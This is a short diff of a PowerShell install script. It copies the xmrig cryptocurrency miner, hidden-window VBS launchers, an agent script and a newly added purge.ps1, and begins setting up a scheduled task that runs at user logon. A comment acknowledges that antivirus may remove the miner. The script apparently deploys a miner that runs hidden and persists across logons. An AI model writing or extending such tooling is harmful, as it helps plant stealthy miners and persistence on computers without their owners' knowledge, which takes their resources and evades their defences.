@@ -44,7 +44,7 @@ if (Test-Path "$src\xmrig.exe") {
 if (-not (Test-Path "$dest\xmrig.exe")) { throw "xmrig.exe is missing from $dest (antivirus may have removed it)." }
 
 # Config, launchers, and agent files (copied last so they always win)
-Copy-Item "$src\config.json", "$src\start.bat", "$src\run-hidden.vbs", "$src\agent.ps1", "$src\run-agent-hidden.vbs" $dest -Force
+Copy-Item "$src\config.json", "$src\start.bat", "$src\run-hidden.vbs", "$src\agent.ps1", "$src\run-agent-hidden.vbs", "$src\purge.ps1" $dest -Force
 
 # Shared task settings
 $trigger   = New-ScheduledTaskTrigger -AtLogOn -User $user
